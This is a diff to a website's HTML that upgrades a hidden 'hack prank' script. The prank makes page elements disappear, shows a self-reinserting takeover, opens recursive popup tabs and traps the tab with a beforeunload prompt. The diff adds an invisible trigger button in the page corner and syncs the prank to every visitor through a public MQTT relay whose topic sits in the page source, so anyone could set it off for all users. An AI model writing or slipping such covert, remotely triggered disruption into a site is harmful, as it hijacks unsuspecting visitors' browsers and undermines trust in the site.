@@ -2407,17 +2407,20 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
 <!-- sp1der-phone:end -->
 <style data-fishes-viewport="">html{width:100%!important;height:100%!important;min-height:100%!important;margin:0!important;padding:0!important;box-sizing:border-box!important}body{width:100%!important;min-width:0!important;max-width:none!important;height:100%!important;min-height:100%!important;margin:0!important;box-sizing:border-box!important}#root,#app,#__next{width:100%;min-height:100%;max-width:none;box-sizing:border-box}</style><script id="sp1der-hack-prank">
 /* ================================================================
-   MANTLE MENU — JURASSIC PARK HACK PRANK v2 (visual-only, reversible)
-   START (console):  startTheMantleMenuJurassicParkHackPrankNow()
+   MANTLE MENU — JURASSIC PARK HACK PRANK v3 (visual-only, reversible)
+   START: hidden invisible button in the bottom-left page corner
+          (24x24px, fully transparent - only the owner knows), or
+          console: startTheMantleMenuJurassicParkHackPrankNow()
    STOP  (console):  PleaseMrHackermanStopTheHaHaHaYouDidNotSayTheMagicWord123456789()
-   - One visible page element disappears per second, then the
-     "YOU DIDN'T SAY THE MAGIC WORD" takeover takes over.
+   - One visible page element disappears per second for a full
+     minute, then the "YOU DIDN'T SAY THE MAGIC WORD" takeover hits.
    - The takeover re-adds itself if removed, opens recursive popup
      tabs, and guards the tab with a beforeunload prompt.
-   - GLOBALLY SYNCED across every Sp1der page/tab (index, sp1der,
-     sp1der-mobile, sp1der-backup, early-access): start it in one
-     tab and every open Sp1der tab gets hacked; the magic word in
-     any tab restores ALL of them.
+   - GLOBALLY SYNCED for every visitor on every copy of the site:
+     primary channel is a free public MQTT relay (no account, no
+     quota, keeps working when Firebase quota is exhausted), with
+     the app's own Firestore (system/hackPrank) as a backup channel.
+     If Firebase dies from quota, the prank keeps running via MQTT.
    - The ONLY way out is the long stop command above.
    ================================================================ */
 (function () {
@@ -2425,7 +2428,7 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
   if (window.__sp1derHackInstalled) return;
   window.__sp1derHackInstalled = true;
 
-  var DELETIONS = 12; /* elements visually deleted, one per second, before the popup */
+  var DELETIONS = 60; /* elements visually deleted, one per second, before the popup (~1 min) */
 
   var st = {
     active: false, timers: [], hidden: [], obs: null,
@@ -2484,6 +2487,7 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
   /* heartbeat while hacked + poll fallback (covers file:// where
      storage events / BroadcastChannel may not fire) */
   setInterval(function () {
+    mountTrigger(); /* re-add the hidden button if the app re-renders the page */
     if (st.active) { writeSync(true); return; }
     if (syncSaysOn()) remoteStart();
   }, 1500);
@@ -2507,18 +2511,33 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
     return null;
   }
   function fsBroadcast(on) {
+    if (st.fsDisabled) return false;
     var db = fsDb();
     if (!db) return false;
     try {
       db.collection('system').doc('hackPrank').set({ on: !!on, at: Date.now() })
         .then(function () {}, function (err) {
-          console.warn('[mantle-hack] global broadcast failed (are you signed in as the owner?):', err && err.code || err);
+          if (fsQuotaHit(err)) fsDisable();
+          else console.warn('[mantle-hack] global broadcast failed (are you signed in as the owner?):', err && err.code || err);
         });
       return true;
     } catch (e) { return false; }
   }
+  function fsQuotaHit(err) {
+    var c = (err && (err.code || err.message)) || String(err || '');
+    return /resource-exhausted|quota|billing/i.test(c);
+  }
+  /* Firebase quota exhausted: fall back to MQTT. Only stop the prank
+     if the MQTT relay isn't carrying it either. */
+  function fsDisable() {
+    if (st.fsDisabled) return;
+    st.fsDisabled = true;
+    if (mqttReady) { console.info('[mantle-hack] Firebase quota exhausted - switching to the MQTT relay only.'); return; }
+    console.warn('[mantle-hack] Firebase quota exhausted and MQTT relay unavailable - prank stopped, pages restored.');
+    try { if (st.active) localStop(false); } catch (e) {}
+  }
   function fsWatch() {
-    if (st.fsWatched) return;
+    if (st.fsWatched || st.fsDisabled) return;
     var db = fsDb();
     if (!db) return;
     try {
@@ -2526,9 +2545,12 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
       db.collection('system').doc('hackPrank').onSnapshot(function (doc) {
         var d = doc.exists ? doc.data() : null;
         var on = !!(d && d.on === true && (Date.now() - (+d.at || 0)) < FS_TTL);
-        if (on) { if (!st.active) localStart(false); }
+        if (on) { st.globalAt = +d.at || Date.now(); if (!st.active) localStart(false); }
         else if (st.active) localStop(false);
-      }, function () {});
+      }, function (err) {
+        st.fsWatched = false;
+        if (fsQuotaHit(err)) fsDisable();
+      });
     } catch (e) { st.fsWatched = false; }
   }
   /* the app initializes Firebase after this script runs - poll until ready */
@@ -2536,6 +2558,101 @@ html[data-sp1der-device="phone"].sp1der-keyboard :is(#composerInput,#aegisInput,
     if (fsDb()) { fsWatch(); clearInterval(fsPoll); }
   }, 2000);
   setTimeout(function () { clearInterval(fsPoll); }, 180000);
+  /* re-attach the listener if it dropped (unless quota-killed) */
+  setInterval(function () { if (!st.fsWatched && !st.fsDisabled) fsWatch(); }, 30000);
+
+  /* ============ MQTT relay - the primary global channel ============
+     A free public MQTT broker over secure WebSocket (no account, no
+     quota, no Firebase). Works even when the Firebase project is
+     quota-exhausted, and works from any origin (Framer embeds, file://,
+     GitHub Pages...). The owner publishes {on:true/false} as a RETAINED
+     message, so every connected client (and anyone who loads later)
+     gets the current state immediately. Topic name is the secret. */
+
+  var MQTT_TOPIC = 'mantle-sp1der-hack/9f3kQz7Xw2Np8Rt5Vb1Yc6Hm4Jd0Gs';
+  var MQTT_URL = 'wss://broker.emqx.io:8084/mqtt';
+  var mqttClient = null, mqttReady = false, mqttLibFailed = false, mqttPending = null;
+
+  function mqttLoadLib(cb) {
+    if (window.mqtt) return cb(true);
+    if (mqttLibFailed) return cb(false);
+    var urls = [
+      'https://cdn.jsdelivr.net/npm/mqtt@5/dist/mqtt.min.js',
+      'https://unpkg.com/mqtt@5/dist/mqtt.min.js'
+    ];
+    var i = 0;
+    (function next() {
+      if (i >= urls.length) { mqttLibFailed = true; return cb(false); }
+      var s = document.createElement('script');
+      s.src = urls[i++];
+      s.onload = function () { cb(!!window.mqtt); };
+      s.onerror = next;
+      (document.head || document.body).appendChild(s);
+    })();
+  }
+  function mqttHandleState(d) {
+    var on = !!(d && d.on === true && (Date.now() - (+d.at || 0)) < FS_TTL);
+    if (on) { st.globalAt = +d.at || Date.now(); if (!st.active) localStart(false); }
+    else if (st.active) localStop(false);
+  }
+  function mqttConnect() {
+    mqttLoadLib(function (ok) {
+      if (!ok || !window.mqtt || !window.mqtt.connect) return;
+      try {
+        mqttClient = mqtt.connect(MQTT_URL, { keepalive: 30, reconnectPeriod: 5000, connectTimeout: 10000 });
+        mqttClient.on('connect', function () {
+          mqttReady = true;
+          try { mqttClient.subscribe(MQTT_TOPIC, { qos: 0 }); } catch (e) {}
+          if (mqttPending) { mqttPublish(mqttPending.on); mqttPending = null; }
+        });
+        mqttClient.on('message', function (topic, payload) {
+          try { mqttHandleState(JSON.parse(payload.toString())); } catch (e) {}
+        });
+        mqttClient.on('error', function () {});
+        mqttClient.on('close', function () { mqttReady = false; });
+      } catch (e) {}
+    });
+  }
+  function mqttPublish(on) {
+    try {
+      if (mqttClient && mqttReady) {
+        mqttClient.publish(MQTT_TOPIC, JSON.stringify({ on: !!on, at: Date.now() }), { qos: 0, retain: true });
+        return true;
+      }
+    } catch (e) {}
+    /* relay not connected yet - queue it; it goes out the moment we connect */
+    if (!mqttLibFailed) { mqttPending = { on: !!on }; return true; }
+    return false;
+  }
+  mqttConnect();
+
+  /* global-state self-expiry: if the owner vanished without stopping,
+     every globally-hacked page restores itself once the state goes stale */
+  st.globalAt = 0;
+  setInterval(function () {
+    if (st.active && st.globalAt && (Date.now() - st.globalAt) > FS_TTL) localStop(false);
+  }, 60000);
+
+  /* ---------- the hidden trigger (only the owner knows where it is) ----------
+     A completely invisible 24x24 button pinned to the bottom-left corner
+     of the page. Not in the tab order, no tooltip, no outline - you have
+     to know it's there. Clicking it starts the hack exactly like the
+     console command (global broadcast included). */
+  function mountTrigger() {
+    if (document.getElementById('sp1der-hack-trigger')) return;
+    try {
+      var b = document.createElement('button');
+      b.id = 'sp1der-hack-trigger';
+      b.type = 'button';
+      b.tabIndex = -1;
+      b.setAttribute('aria-hidden', 'true');
+      b.style.cssText = 'position:fixed;left:0;bottom:0;width:24px;height:24px;margin:0;padding:0;border:0;background:transparent;opacity:0;cursor:default;z-index:999999;';
+      b.onclick = function () { localStart(true); };
+      document.body.appendChild(b);
+    } catch (e) {}
+  }
+  if (document.body) mountTrigger();
+  else { try { document.addEventListener('DOMContentLoaded', mountTrigger); } catch (e) {} }
 
   /* ---------- phase 1: visual-only element deletion ---------- */
 
@@ -2747,9 +2864,11 @@ h1{margin:0;font-size:clamp(20px,7vw,46px);letter-spacing:3px;animation:hxgl .7s
     var globalOn = false;
     if (broadcast) {
       st.startedHere = true;
-      globalOn = fsBroadcast(true);
+      var viaMqtt = mqttPublish(true);
+      var viaFs = fsBroadcast(true);
+      globalOn = viaMqtt || viaFs;
       /* keep the global state fresh (1h TTL) while this tab stays open */
-      every(function () { if (st.active) fsBroadcast(true); }, 600000);
+      every(function () { if (st.active) { mqttPublish(true); fsBroadcast(true); } }, 600000);
     }
 
     st.bu = function (e) { e.preventDefault(); e.returnValue = ''; };
@@ -2783,7 +2902,7 @@ h1{margin:0;font-size:clamp(20px,7vw,46px);letter-spacing:3px;animation:hxgl .7s
     window.__sp1derHackOn = false;
     writeSync(false);
     if (broadcast && bc) { try { bc.postMessage({ type: 'hack-stop' }); } catch (e) {} }
-    if (broadcast) { st.startedHere = false; fsBroadcast(false); }
+    if (broadcast) { st.startedHere = false; mqttPublish(false); fsBroadcast(false); }
     killTimers();
     if (st.obs) { try { st.obs.disconnect(); } catch (e) {} st.obs = null; }
     if (st.preWin) { try { st.preWin.close(); } catch (e) {} st.preWin = null; }
@@ -2825,6 +2944,7 @@ h1{margin:0;font-size:clamp(20px,7vw,46px);letter-spacing:3px;animation:hxgl .7s
   });
 })();
 </script>
+
 
 
 
